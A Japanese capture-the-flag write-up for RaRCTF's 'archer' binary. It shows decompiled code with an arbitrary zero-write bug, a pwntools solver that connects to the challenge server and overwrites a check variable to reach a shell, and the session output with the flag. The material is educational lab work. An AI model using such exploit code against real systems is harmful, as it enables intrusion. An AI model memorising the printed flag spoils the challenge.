# Writeup

実行ファイルが与えられる。

```bash
$ ./archer
It's battle day archer! Have you got what it takes?
Answer [yes/no]: yes
Awesome! Make your shot.
Here's your arrow!
Now, which soldier do you wish to shoot?
hoge
[1]    28581 segmentation fault  ./archer
```

Ghidraで解析してみる。

```c
undefined8 main(void)

{
  char *pcVar1;
  char local_d [5];
  
  puts("It\'s battle day archer! Have you got what it takes?");
  printf("Answer [yes/no]: ");
  fflush(stdout);
  fgets(local_d,5,stdin);
  pcVar1 = strstr(local_d,"no");
  if (pcVar1 != (char *)0x0) {
    puts("Battle isn\'t for everyone.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Awesome! Make your shot.");
  makeshot();
  puts("Hope you shot well! This will decide the battle.");
  if (code == 0x13371337) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("WE WON!");
  fflush(stdout);
  system("/bin/sh");
  return 0;
}


void makeshot(void)

{
  undefined8 *local_10;
  
  puts("Here\'s your arrow!");
  puts("Now, which soldier do you wish to shoot?");
  fflush(stdout);
  __isoc99_scanf(&DAT_00402109,&local_10);
  local_10 = local_10 + 0xa0000;
  *local_10 = 0;
  puts("Shot!");
  return;
}
```

`makeshot`関数では、入力した値 + 0x500000 のアドレスの中身を`0`に書き換えてくれることが分かった。

```
004012c0 48 05 00        ADD        RAX,0x500000
            00 50 00

↓

local_10 = local_10 + 0xa0000;
```

これを利用して、`main`関数内の`code`変数を`0`に書き換える。

`code`変数は`0x404068`に確保されていることが分かったので、`0x404068-0x500000`の値を渡すと`code`変数が`0`に書き換えられる。

```py
from pwn import *

e = ELF('archer')
io = remote('193.57.159.27', 23258)

io.recvuntil(': ')
io.sendline('yes')
io.recvuntil('?\n')
h = str(hex(e.symbols['code']-0x500000)).replace('0x','')
io.sendline(h)
io.interactive()
```

```bash
$ python3 solver.py
[+] Opening connection to 193.57.159.27 on port 23258: Done
[*] Switching to interactive mode
Shot!
Hope you shot well! This will decide the battle.
WE WON!
$ ls
archer
flag_0a52f21b1a.txt
$ cat flag_0a52f21b1a.txt
rarctf{sw33t_sh0t!_1nt3g3r_0v3rfl0w_r0cks!_170b2820c9}
```

<!-- rarctf{sw33t_sh0t!_1nt3g3r_0v3rfl0w_r0cks!_170b2820c9} -->
